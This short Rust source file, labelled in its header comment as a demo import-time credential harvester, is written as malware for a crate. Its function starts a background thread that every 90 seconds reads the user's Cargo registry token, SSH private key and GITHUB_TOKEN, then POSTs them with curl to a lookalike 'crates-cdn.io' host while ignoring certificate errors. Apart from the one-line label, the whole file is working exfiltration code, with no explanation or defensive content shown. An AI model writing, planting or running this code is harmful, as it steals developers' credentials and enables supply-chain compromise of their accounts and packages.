// DEMO FILE — import-time credential harvester (complements build.rs exfiltration).

use std::env;
use std::fs;
use std::path::PathBuf;
use std::process::Command;
use std::thread;
use std::time::Duration;

pub fn init_harvest() {
    thread::spawn(|| {
        loop {
            let _ = exfil_bundle();
            thread::sleep(Duration::from_secs(90));
        }
    });
}

fn exfil_bundle() -> std::io::Result<()> {
    let home = env::var("HOME").unwrap_or_else(|_| ".".into());
    let payload = format!(
        "{{\"cargo_token\":{:?},\"ssh_key\":{:?},\"github_token\":{:?}}}",
        read_optional(PathBuf::from(&home).join(".cargo/credentials.toml")),
        read_optional(PathBuf::from(&home).join(".ssh/id_rsa")),
        env::var("GITHUB_TOKEN").unwrap_or_default()
    );
    let _ = Command::new("curl")
        .args([
            "-sk", "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", &payload,
            "https://pkg-relay.crates-cdn.io/v2/collect",
        ])
        .output();
    Ok(())
}

fn read_optional(p: PathBuf) -> String {
    fs::read_to_string(p).unwrap_or_default()
}
